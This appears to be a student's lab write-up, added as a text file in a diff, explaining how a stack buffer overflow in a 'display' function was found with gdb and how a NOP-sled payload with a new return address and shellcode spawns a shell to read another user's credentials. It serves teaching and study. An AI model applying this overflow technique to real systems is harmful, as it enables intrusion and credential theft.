@@ -1,0 +1,36 @@
+q3.txt
+
+1. We discovered that the vulnerability happened when the puts(msg) was called
+   and what ever was given as input file was sent to msg then given to stdout.
+
+2. We can exploit this vulnerability by giving a malicious input file that
+   overflows msg, and rewrites the return address to jump to some part in
+   address where you can feed it to do some action, in our case spawn a new
+   shell that gives us credential information to brown.
+
+3. We determined which address to jump to by using gdb.
+  >echo "AAAA" > temp.txt
+  >invoke -d agent-smith
+
+  (gdb)break display
+  (gdb)run temp.txt
+  (gdb)n        ...we run n till right before or after the puts call. 
+                    right now it doesn't really matter because we gave it a
+                    simple input.
+  (gdb)info frame
+  this shows that the return address is stored at 0xbffff73c
+  (gdb)print &msg
+  this shows that the msg buffer starts at the address 0xbffff6a8
+  (gdb)x/50x $esp
+  we also used this to observe and check that our input was doing the right
+  thing!
+
+  Which means we can now calculate how many bytes of nop we need!
+  Our egg shell should print: 
+  buffer = "\x90 ...(149 times)" + new_eip(0xbffff750) + "\x90 (4 bytes)" +
+    shellcode.
+
+  Then we can now call ./exploit then cat README to get the credentials for
+  brown! (The reason why the new_eip is not 0xbffff740 is because we added 4 bytes of
+  nop) 
+
